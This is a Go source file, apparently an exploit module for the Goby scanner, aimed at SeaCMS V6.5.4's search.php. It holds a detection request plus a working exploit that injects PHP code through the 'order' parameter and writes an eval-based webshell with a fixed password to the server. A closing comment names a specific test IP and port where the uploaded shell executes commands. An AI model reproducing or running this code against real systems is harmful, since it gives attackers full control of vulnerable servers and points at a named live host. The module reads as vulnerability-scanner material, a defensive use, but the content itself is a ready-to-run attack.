package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "SEACMS search.php GetShell",
    "Description": "Seacms arbitrary code execution, upload shell",
    "Product": "seacms V6.5.4",
    "Homepage": "https://www.seacms.net/",
    "DisclosureDate": "2021-06-09",
    "Author": "hututued",
    "GobyQuery": "body=\"/templets/default/images/js/\" || (title==\"seacms\" || body=\"Powered by SeaCms\" || body=\"content=\\\"seacms\" || body=\"seacms.cms.nav('{$model}')\" || body=\"sea-vod-type\" || body=\"http://www.seacms.net\" || (body=\"search.php?searchtype=\" && (body=\"/list/?\" || body=\"seacms:sitename\")))",
    "Level": "3",
    "Impact": "<p>This will cause the attacker to gain server privileges and control the whole server</p>",
    "Recommendation": "<p>Upgrade to the latest official version</p>",
    "References": [
        "https://mengsec.com/2018/08/06/SeaCMS-v6-45%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "webshell",
            "type": "input",
            "value": "<?php eval($_POST[\"pass\"]);?>"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10242"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		// PoC 函数
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/search.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
			reff := u.FixedHostInfo
			cfg.Header.Store("Referer", reff+"/search.php")
			cfg.Header.Store("Origin", reff)
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
			cfg.VerifyTls = false
			cfg.Data = "searchtype=5&order=%7D%7Bend+if%7D+%7Bif%3A1%29print%28md5%2888%29%29%3Bif%281%7D%7Bend+if%7D"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 500 && strings.Contains(resp.Utf8Html, "2a38a4a9316c49e5a833517c45d310702a38a4a9316c")
			}
			return false
		},

		// Exp 函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/search.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Cache-Control", "max-age=0")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
			reff := expResult.HostInfo.FixedHostInfo
			cfg.Header.Store("Referer", reff+"/search.php")
			cfg.Header.Store("Origin", reff)
			cfg.VerifyTls = false
			s := fmt.Sprintf("%08v", rand.New(rand.NewSource(time.Now().UnixNano())).Int63n(100000000))
			webshell := ss.Params["webshell"].(string)
			cfg.Data = fmt.Sprintf("searchtype=5&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen(\"%s.php\",\"w\"),'%s')", s, webshell)

			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 500 {
					expResult.Output = "webshell url: " + expResult.HostInfo.FixedHostInfo + "/" + s + ".php, pass:pass"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

/*测试ip端口  164.155.74.69:80 上传webshell更好执行命令
1.POC的data的参数可以url编码，exp的data因为使用sprintf函数不能进行url编码
2.硬编码已经删除
3.exp生产文件已经随机
4.poc的验证已经改为md5
*/
